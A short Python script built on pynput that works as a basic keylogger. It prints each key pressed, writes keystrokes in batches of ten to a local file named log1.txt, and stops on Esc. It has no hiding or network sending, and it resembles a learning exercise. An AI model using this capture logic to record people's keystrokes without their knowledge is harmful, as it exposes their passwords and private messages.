import pynput
from pynput.keyboard import Key, Listener

keys = []
count = 0


def on_release(key):
    if key == Key.esc:
        return False


def on_press(key):
    print("{} key is pressed".format(key))
    global keys, count
    keys.append(key)
    count += 1
    if count >= 10:
        count = 0
        writefile(keys)
        keys = []


def writefile(keys):
    with open("log1.txt", "a") as f:
        for key in keys:
            f.write(str(key).replace("'",""))


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
